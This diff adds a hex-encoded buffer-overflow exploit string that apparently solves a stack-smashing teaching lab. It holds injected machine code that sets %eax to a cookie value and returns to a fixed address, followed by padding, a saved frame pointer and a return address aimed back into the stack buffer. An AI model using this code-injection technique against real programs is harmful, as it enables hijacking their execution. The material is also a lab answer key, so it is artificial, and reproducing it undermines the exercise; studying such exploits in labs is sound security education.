@@ -1,0 +1,11 @@
+/* Padding required:                 44 bytes */
+
+b8 c4 b2 fa 19	/* mov $0x19fab2c4, %eax */
+68 81 8e 04 08	/* push $0x08048e81 */
+c3	/* ret */
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+00 00 00 00 00
+/* old ebp */
+50 3e 68 55
+/* save starts at 0x55683df8 */
+f8 3d 68 55
